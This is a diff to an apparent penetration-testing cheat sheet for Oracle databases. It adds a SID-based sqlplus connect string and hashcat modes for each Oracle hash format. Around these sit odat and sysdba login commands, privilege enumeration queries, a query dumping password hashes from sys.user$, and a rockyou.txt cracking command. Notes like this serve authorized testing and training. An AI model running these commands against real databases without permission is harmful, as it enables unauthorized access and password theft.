@@ -25,6 +25,8 @@ odat externaltable -s <TargetIP> -d <Database> -U '<Username>' -P '<Password>' -
 ## SQL*Plus
 sqlplus '<Username>'/'<Password>'@<TargetIP>:1521/<Database>
 sqlplus '<Username>'/'<Password>'@<TargetIP>:1521/<Database> as sysdba
+When the service name is not the SID, connect by SID:
+sqlplus '<Username>'/'<Password>'@'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=<TargetIP>)(PORT=1521))(CONNECT_DATA=(SID=<Database>)))'
 - [ ] sqlplus missing: Oracle Instant Client, basic and sqlplus, with its folder on PATH and LD_LIBRARY_PATH
 SELECT * FROM session_privs;
 SELECT * FROM user_role_privs;
@@ -37,3 +39,5 @@ SELECT * FROM THE-OWNER.<Table>;
 ## Password hashes
 SELECT name, password, spare4 FROM sys.user$;
 - [ ] password is the old DES hash, spare4 holds the S: and T: hashes of newer versions
+- [ ] For hashcat: -m 3100 for the DES hash as hash:username, -m 112 for S: as its first 40 hex, a colon, then the last 20, -m 12300 for T:
+hashcat -m 112 oracle.hash /usr/share/wordlists/rockyou.txt
